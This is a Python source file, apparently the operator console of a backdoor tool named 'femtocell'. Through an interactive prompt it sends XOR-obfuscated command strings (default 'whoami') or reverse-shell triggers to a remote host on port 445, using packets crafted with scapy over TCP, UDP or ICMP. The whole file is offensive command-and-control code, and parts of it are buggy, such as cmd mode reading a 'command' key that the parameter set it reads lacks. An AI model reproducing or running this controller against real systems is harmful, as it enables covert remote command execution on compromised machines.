from email.mime import base
from re import A
import scapy.all as scapy
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
# from prompt_toolkit.contrib.completers import WordCompleter
import click
import os

""" 
set
- mode (shell vs cmd)
- transport (i/u/t)
- lhost (get from eth adapter)
- rhost (REQUIRED)
- lport (6006)
- rport (445)
- command (whoami)
- if mode is shell, listen on lhost:lport
- if mode is cmd, use cmd option
show
- all



"""

baseparams = {
    "mode":"cmd",
}

cmdparams = {
    "rhost": "",
    "rport": 445,
    "command": "whoami",
    "lport": 6006,
    "transport": "tcp"
}

shellparams = {
    "rhost": "",
    "rport": 445,
    "lhost": "",
    "lport": 6006,
    "transport": "tcp"
}

def xor_encrypt(byte_msg, byte_key):
    encrypt_byte = b''
    for b in byte_msg:
        # print(byte_msg, byte_key, b)
        encrypt_byte += chr(b ^ byte_key).encode()
    return encrypt_byte


def print_help():
    print("read the fucking readme")


def print_options(p):
    for item in p.keys():
        print(f"\n{item}: {p[item]}")
    print()


def main():
    print("""
    ____               __                  ____
   / __/__  ____ ___  / /_____  ________  / / /
  / /_/ _ \/ __ `__ \/ __/ __ \/ ___/ _ \/ / / 
 / __/  __/ / / / / / /_/ /_/ / /__/  __/ / /  
/_/  \___/_/ /_/ /_/\__/\____/\___/\___/_/_/   

    ~ kindtime & jake

    """)
# base params
# cmd params
# shell params


    # SQLCompleter = WordCompleter(['select', 'from', 'insert', 'update', 'delete', 'drop'],ignore_case=True)

    if not os.path.exists("./history"):
        os.system("mkdir history")

    if not os.path.isfile("./history/main.history"):
        os.system("touch main.history")

    if not os.path.isfile("./history/cmd.history"):
        os.system("touch cmd.history")

    while(True):
        user_in = prompt(u'femtocell ~ ',
                        history=FileHistory('history/main.history'),
                        auto_suggest=AutoSuggestFromHistory(),
                        # completer=SQLCompleter,
                        ).split()
        # click.echo_via_pager(user_input)

        if(len(user_in) > 1):
            user_cmd = user_in[0]
            if(user_cmd == "set"):
                baseparams[user_in[1]] = user_in[2]
                if user_in[1] == "mode":
                    if baseparams["mode"] == "shell":
                        shellPrompt()
                    elif baseparams["mode"] == "cmd":
                        cmdPrompt()
            if(user_cmd == "show"):
                if(user_in[1] == "all"):
                    print(str(baseparams))
                else:
                    print(baseparams[user_in[1]])
        elif len(user_in) == 1:
            if user_in[0] == "exit":
                exit()
            elif user_in[0] == "help":
                print_help()
            else:
                print_help()
        else:
            print_help()


def cmdPrompt():
    while True:
        user_in = prompt(f'femtocell ({baseparams["mode"]}) ~ ',
                        history=FileHistory('history/cmd.history'),
                        auto_suggest=AutoSuggestFromHistory(),
                        # completer=SQLCompleter,
                        ).split()
        
        if user_in[0] == "exit":
            return
        elif user_in[0] == "options":
            print_options(cmdparams)
        elif user_in[0] == "send":
            plaintext = "FC-SH-{}\00".format(shellparams["command"]) 
            send(plaintext)
        else:			
            continue


def shellPrompt():
    while True:
        user_in = prompt(f'femtocell ({baseparams["mode"]}) ~ ',
                        history=FileHistory('history/shell.history'),
                        auto_suggest=AutoSuggestFromHistory(),
                        # completer=SQLCompleter,
                        ).split()
        
        if user_in[0] == "exit":
            return
        elif user_in[0] == "options":
            print_options(shellparams)
            continue
        elif user_in[0] == "send":
            plaintext = "FC-SH-{}\00".format(shellparams["lhost"])
            send(plaintext) 
        else:			
            continue


def send(plaintext):
    encrypted = xor_encrypt(plaintext.encode(), 0x10)
    
    if(shellparams["transport"] == "udp"):
        scapy.send(scapy.IP(dst=shellparams["rhost"].encode(), src=shellparams["lhost"].encode())/
        scapy.UDP(sport=shellparams["lport"], dport=shellparams["rport"])/encrypted)
    elif(shellparams["transport"] == "tcp"):
        scapy.send(scapy.IP(dst=shellparams["rhost"].encode(), src=shellparams["lhost"].encode())/
        scapy.TCP(sport=shellparams["lport"], dport=shellparams["rport"], flags="AP")/
        encrypted)
    elif(shellparams["transport"] == "icmp"):
        scapy.send(scapy.IP(dst=shellparams["rhost"].encode(), src=shellparams["lhost"].encode())/
        scapy.ICMP(code=1, type=8)/
        encrypted)


if(__name__ == "__main__"):
    main()